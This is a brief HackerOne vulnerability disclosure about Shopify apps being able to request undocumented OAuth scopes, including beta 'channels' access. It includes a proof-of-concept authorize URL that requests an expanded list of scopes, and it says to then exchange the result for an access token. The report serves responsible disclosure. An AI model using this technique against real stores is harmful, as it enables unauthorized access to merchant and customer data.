# HackerOne Report: Apps can access 'channels' beta api
**Report ID:** 98499
**Vulnerability Class:** Privilege Escalation

## Vulnerability Information & PoC
**Hello,**

As documented here, an app can access to the following scopes :
https://docs.shopify.com/api/authentication/oauth#scopes. 
But an app can request/get access to a lots more scopes, and some of those scope shouldn't be accessible.

**PoC**

    https://victim.myshopify.com/admin/oauth/authorize?client_id=fc49e813f5aad9c8d8f65117031a9684&scope=read_apps,write_apps,write_content,read_content,write_customers,read_customers,read_disputes,write_fulfillments,read_fulfillments,write_gift_cards,read_gift_cards,write_orders,read_orders,read_products,write_products,read_script_tags,write_script_tags,write_scripts,read_scripts,read_shipping,write_shipping,write_social_network_accounts,read_social_network_accounts,read_themes,write_themes,read_channels,write_channels&redirect_uri=http://while42.myshopify.com/&state=123&shop=while42
    
Then request the access_token, and use it to access to any of those scopes.

## Discussion & Remediation Timeline
